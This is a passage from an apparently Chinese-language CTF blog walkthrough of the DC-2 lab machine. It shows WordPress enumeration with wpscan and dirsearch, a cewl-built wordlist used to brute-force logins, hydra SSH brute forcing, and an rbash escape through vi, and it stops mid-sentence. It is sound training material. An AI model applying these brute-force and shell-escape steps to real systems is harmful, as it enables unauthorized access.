</span><br><span class="hljs-string">|   /wp-login.php: Possible admin folder</span><br><span class="hljs-string">|   /readme.html: Wordpress version: 2 </span><br><span class="hljs-string">|   /: WordPress version: 4.7.10</span><br><span class="hljs-string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span><br><span class="hljs-string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span><br><span class="hljs-string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span><br><span class="hljs-string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span><br><span class="hljs-string">|   /wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|   /wp-admin/upgrade.php: Wordpress login page.</span><br><span class="hljs-string">|_  /readme.html: Interesting, a readme.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-wordpress-users: </span><br><span class="hljs-string">| Username found: admin</span><br><span class="hljs-string">| Username found: tom</span><br><span class="hljs-string">| Username found: jerry</span><br><span class="hljs-string">|_Search stopped at ID #25. Increase the upper limit if necessary with &#x27;</span>http-wordpress-users.limit<span class="hljs-string">&#x27;</span><br><span class="hljs-string">7744/tcp open  raqmon-pdu</span><br><span class="hljs-string">MAC Address: 08:00:27:00:39:E2 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.03 seconds</span><br></code></pre></td></tr></table></figure><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>漏洞脚本扫描扫出来了 wordpress，顺便目录爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ sudo dirsearch -u http://dc-2/                 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/dc-2/-_23-07-09_10-49-19.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-09_10-49-19.<span class="hljs-built_in">log</span><br><br>Target: http://dc-2/<br><br>[10:49:19] Starting: <br>[10:49:21] 403 -  290B  - /.ht_wsr.txt                                     <br>[10:49:21] 403 -  293B  - /.htaccess.save                                  <br>[10:49:21] 403 -  293B  - /.htaccess.orig<br>[10:49:21] 403 -  295B  - /.htaccess.sample<br>[10:49:21] 403 -  293B  - /.htaccess.bak1<br>[10:49:21] 403 -  284B  - /.html<br>[10:49:21] 403 -  291B  - /.htaccessBAK<br>[10:49:21] 403 -  291B  - /.htaccess_sc                                    <br>[10:49:21] 403 -  283B  - /.htm<br>[10:49:21] 403 -  294B  - /.htaccess_extra<br>[10:49:21] 403 -  291B  - /.htaccessOLD<br>[10:49:21] 403 -  292B  - /.htaccessOLD2<br>[10:49:21] 403 -  293B  - /.htaccess_orig<br>[10:49:21] 403 -  289B  - /.htpasswds<br>[10:49:21] 403 -  290B  - /.httr-oauth                                     <br>[10:49:21] 403 -  293B  - /.htpasswd_test                                  <br>[10:49:21] 403 -  283B  - /.php                                            <br>[10:49:21] 403 -  284B  - /.php3                                           <br>[10:49:41] 301 -    0B  - /index.php  -&gt;  http://dc-2/                      <br>[10:49:43] 200 -   19KB - /license.txt                                      <br>[10:49:50] 200 -    7KB - /readme.html                                      <br>[10:49:51] 403 -  292B  - /server-status                                    <br>[10:49:51] 403 -  293B  - /server-status/<br>[10:49:58] 301 -  299B  - /wp-admin  -&gt;  http://dc-2/wp-admin/              <br>[10:49:58] 200 -    0B  - /wp-content/                                      <br>[10:49:58] 301 -  301B  - /wp-content  -&gt;  http://dc-2/wp-content/          <br>[10:49:58] 200 -   69B  - /wp-content/plugins/akismet/akismet.php           <br>[10:49:58] 500 -    0B  - /wp-content/plugins/hello.php                     <br>[10:49:58] 301 -  302B  - /wp-includes  -&gt;  http://dc-2/wp-includes/        <br>[10:49:58] 500 -    0B  - /wp-includes/rss-functions.php                    <br>[10:49:58] 200 -    0B  - /wp-config.php                                    <br>[10:49:58] 200 -   40KB - /wp-includes/                                     <br>[10:49:59] 302 -    0B  - /wp-admin/  -&gt;  http://dc-2/wp-login.php?redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;reauth=1<br>[10:49:59] 200 -    1B  - /wp-admin/admin-ajax.php                          <br>[10:49:59] 200 -    2KB - /wp-login.php                                     <br>[10:49:59] 302 -    0B  - /wp-signup.php  -&gt;  http://dc-2/wp-login.php?action=register<br>[10:49:59] 200 -    0B  - /wp-cron.php                                      <br>[10:49:59] 500 -    4KB - /wp-admin/setup-config.php                        <br>[10:49:59] 200 -    1KB - /wp-admin/install.php                             <br>[10:49:59] 405 -   42B  - /xmlrpc.php                                       <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>感觉比较有价值的有: <code>wp-login.php</code>， <code>wp-content/plugins/akismet/akismet.php</code></p><h2 id="wpscan-扫描"><a href="#wpscan-扫描" class="headerlink" title="wpscan 扫描"></a>wpscan 扫描</h2><p>用 wpscan 收集一下用户和插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ wpscan --url http://dc-2 -e ap,u<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]<br>[+] URL: http://dc-2/ [192.168.56.124]<br>[+] Started: Sun Jul  9 10:11:35 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://dc-2/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyseventeen<br> | Location: http://dc-2/wp-content/themes/twentyseventeen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.2<br> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] jerry<br> | Found By: Wp Json Api (Aggressive Detection)<br> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> | Confirmed By:<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] tom<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Sun Jul  9 10:11:40 2023<br>[+] Requests Done: 27<br>[+] Cached Requests: 37<br>[+] Data Sent: 7.013 KB<br>[+] Data Received: 178.184 KB<br>[+] Memory used: 254.168 MB<br>[+] Elapsed time: 00:00:04<br></code></pre></td></tr></table></figure><p>得到了用户名 <code>admin</code>, <code>tom</code>, <code>jerry</code>，没有扫到插件，可能是没开启强力模式，先去看看 web 界面吧</p><p><img src="/pic/cff9683ff6d6f458e8f8bff60a8cea2a_MD5.png"></p><p>flag 页面给出了提示，大意是使用 <code>cewl</code> 命令来构建字典，否则一般的字典是爆破不出来的，此外第二个 flag 应该是在两个或者多个用户里中的一个。</p><h2 id="cewl-收集字典"><a href="#cewl-收集字典" class="headerlink" title="cewl 收集字典"></a>cewl 收集字典</h2><p>那思路就很明显了，刚才根据 wpscan 获得了用户名列表，然后根据 cewl 构建字典，最后使用 wpscan 来爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/ &gt; passwdlist     <br><br>┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/index.php/what-we-do/ &gt;&gt; passwdlist<br><br>┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/index.php/our-people/ &gt;&gt;passwdlist <br><br>┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/index.php/our-products/ &gt;&gt; passwdlist <br><br>┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/index.php/flag/ &gt;&gt; passwdlist <br></code></pre></td></tr></table></figure><h2 id="wpscan-爆破"><a href="#wpscan-爆破" class="headerlink" title="wpscan 爆破"></a>wpscan 爆破</h2><p>将可见界面的链接都放进了 passwdlist 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ wpscan --url http://dc-2 -U user -P passwdlist <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]<br>[+] URL: http://dc-2/ [192.168.56.124]<br>[+] Started: Sun Jul  9 10:17:34 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://dc-2/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyseventeen<br> | Location: http://dc-2/wp-content/themes/twentyseventeen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.2<br> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups - Time: 00:00:00 &lt;=====================================&gt; (137 / 137) 100.00% Time: 00:00:00<br><br>[i] No Config Backups Found.<br><br>[+] Performing password attack on Xmlrpc against 3 user/s<br>Trying admin / CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Time: 00:00:00 &lt;&gt; (0 / 3585[SUCCESS] - jerry / adipiscing                                                                                      <br>[SUCCESS] - tom / parturient                                                                                        <br>Trying admin / nascetur Time: 00:02:38 &lt;===============                        &gt; (1605 / 3995) 40.17%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Sun Jul  9 10:20:17 2023<br>[+] Requests Done: 1746<br>[+] Cached Requests: 37<br>[+] Data Sent: 836.025 KB<br>[+] Data Received: 992.351 KB<br>[+] Memory used: 253.152 MB<br>[+] Elapsed time: 00:02:42<br></code></pre></td></tr></table></figure><p>找到了两个正确的用户名和密码，进入 wordpress 后台的同时，尝试 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ hydra -L sshuser -P sshpassswd 192.168.56.124 ssh -s 7744<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-09 11:40:34<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task<br>[DATA] attacking ssh://192.168.56.124:7744/<br>[7744][ssh] host: 192.168.56.124   login: tom   password: parturient<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-09 11:40:37<br></code></pre></td></tr></table></figure><p>发现 tom 的账户可以用来 ssh 登录，而 wordpress 后台中，第二个 flag 藏在了 jerry 登录才能看到的 post 中</p><p><img src="/pic/198ad5635aa7680e3c55ae4350145cce_MD5.png"></p><p>这个用户并不是 admin，插件也没法上传，后台是没法上传 shell 了，不过已经拿到了 ssh 登录的用户密码，也就无所谓了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ ssh tom@192.168.56.124 -p 7744<br>tom@192.168.56.124\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sun Jul  9 11:47:06 2023 from 192.168.56.106</span><br><span class="hljs-string">tom@DC-2:~$ whami</span><br><span class="hljs-string">-rbash: whami: command not found</span><br><span class="hljs-string">tom@DC-2:~$ </span><br></code></pre></td></tr></table></figure><h2 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h2><p>不太清楚 rbash 是什么，搜索一下</p><p><a href="https://www.linuxfordevices.com/tutorials/linux/rbash-in-linux">The rbash in Linux - Understanding Restricted Bash - LinuxForDevices</a></p><p>简单归纳一下，实际上 rbash 是出于安全的考虑对用户可以使用的命令进行限制，尝试了几个命令，发现 cd, whoami 等被禁止了，ls 没有被禁止尝试用 ls 进行目录的读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:~$ <span class="hljs-built_in">ls</span><br>flag3.txt  usr<br>tom@DC-2:~$ <span class="hljs-built_in">ls</span> ./usr<br>bin<br>tom@DC-2:~$ <span class="hljs-built_in">ls</span> ./usr/bin<br>less  <span class="hljs-built_in">ls</span>  scp  vi<br></code></pre></td></tr></table></figure><p>当前路径下有四个文件，应该是对应了用户可以使用的四个命令，尝试搜索一下 <code>rbash escape</code> 和 <code>rbash bypass</code></p><p><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">44592-linux-restricted-shell-bypass-guide.pdf (exploit-db.com)</a> exoloit-db 中的这个 pdf 给了许多绕过的方法和思路，看了一下本质上是使用现有命令新启一个 bash，那我们可以借助于 gtfobins 中开启 shell 的方法</p><p>尝试了几个，less 的新启 shell 的方法都有点问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:~$ VISUAL=<span class="hljs-string">&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot;</span> less /etc/profile<br>/bin/rbash: /bin/sh: restricted: cannot specify `/<span class="hljs-string">&#x27; in command names</span><br><span class="hljs-string">/bin/rbash: /bin/sh: restricted: cannot specify `/&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">command</span> names<br><br></code></pre></td></tr></table></figure><p>我选择了使用 vi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi<br>:<span class="hljs-built_in">set</span> shell=/bin/sh<br>:shell<br></code></pre></td></tr></table></figure><p>再就是这里如果 <code>set shell=/bin/bash</code>，仍然无法 bypass，以下是错误记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><br>[1]+  Stopped                 vi<br>tom@DC-2:~$ <span class="hljs-built_in">whoami</span><br>-rbash: <span class="hljs-built_in">whoami</span>: <span class="hljs-built_in">command</span> not found<br><br></code></pre></td></tr></table></figure><p>使用 less 读取 flag3.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Poor old Tom is always running after Jerry. Perhaps he should su <span class="hljs-keyword">for</span> all the stress he causes.<br></code></pre></td></tr></table></figure><p>还是无法使用 cat,whoami 等命令，看一眼环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/home/tom/usr/bin<br></code></pre></td></tr></table></figure><p>看来是因为环境变量里没有常用的程序的路径，一开始我也没想到看环境变量，我是使用绝对路径调用 python 反弹 shell 后发现 shll 依然有很多命令找不到，而在后续翻看文件夹的时候，发现 <code>/usr/bin</code> 